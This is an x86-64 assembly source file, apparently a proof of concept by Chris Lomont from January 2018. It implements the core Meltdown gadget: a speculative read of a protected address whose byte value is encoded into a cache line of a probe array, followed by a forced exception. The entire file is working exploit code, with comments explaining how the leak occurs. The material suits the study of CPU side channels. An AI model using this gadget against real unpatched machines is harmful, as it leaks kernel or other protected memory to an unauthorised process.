; example code to perform meltdown attack
; Chris Lomont
; Jan, 2018

.code

PUBLIC speculative_read

speculative_read PROC
	; RCX holds address, 
	; RDX holds target
	; return in RAX
	; TODO - save regs, stack state?

	; try to read memory into RAX, will trigger exception on protected addresses
	MOVZX	RAX, byte ptr [RCX]	
	
	; speculatively multiply RAX by 4096, the memory page size....
	SHL		RAX, 12		        
	
	; ... and speculatively read a user controlled address, which loads a cache line,
	; and the exploit happens because when the speculative operations fail, 
	; the cache line is still touched, leaking the byte value
	MOVZX	RCX, WORD PTR [RDX + RAX] ; touch cache

	; lots of instructions to execute speculatively in case pipeline long
	REPT 30
	NOP
	ENDM

	; force exception even in test cases for testing
	XOR		EAX,EAX
	MOV		EAX,[EAX]

	RET
speculative_read ENDP

End